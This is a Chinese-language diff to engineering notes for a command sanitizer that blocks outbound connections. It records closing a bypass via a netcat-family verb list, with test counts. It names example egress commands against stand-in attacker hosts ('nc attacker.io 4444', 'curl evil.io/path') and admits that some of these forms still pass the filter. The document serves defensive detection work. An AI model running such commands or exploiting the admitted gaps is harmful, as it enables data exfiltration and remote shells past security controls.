@@ -152,10 +152,18 @@
   主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
   `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
   「长得像主机」的形态会先撞上它。
-  **残留缺口**：`nc attacker.io 4444`、`curl evil.io/path`（无 scheme）仍放行。
-  **2026-10-11 深夜已在两台生产实测确认**（245 `2546-97e833a1`、154
-  `2547-97e833a1`，全路径端到端 13/14 通过，唯一未通过项就是这个残留缺口）。
-  要收口它的唯一自洽方向是**命令动词表**，不要再加形态枚举。
+  - ~~**残留缺口 `nc attacker.io 4444`**~~ —— **r1019 已按动词表收口**。
+    用 `netcatFamilyVerbs = {nc, ncat, netcat, telnet, socat}` 封闭集 + **命令行首个
+    字段**锚定 + 「主机样 token + 纯数字端口」，误伤面从「与脚本调用不可区分」降到 0
+    （实测 0/19 误伤、7/7 拦截，含 r1016/r1017 打断的全部 12 条样本）。
+    **动词表与形态白名单不是一回事**：它枚举的是命令本身，`node`/`python3`/`ruby`
+    压根不进这条分支。flag 一律跳过而不判断 flag 语义（`-w 3` 里那个 `3` 不是端口，
+    判据是**位置**）。只认显式端口，`telnet attacker.io`（默认 23）**不覆盖**，
+    作为残留如实记录。判据 `security/sanitize/r1019_netcat_egress_test.go`（6 条，
+    含动词表封闭性钉子），变异验证 6/6 变红。
+  - **残留缺口（仍在）**：`curl evil.io/path`（无 scheme、无端口）放行。它与
+    `cat README.md`、`pip install -r requirements.txt` 结构上不可区分，同属形态枚举
+    的禁区，不要试图收口。
 - ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
   整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
   放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
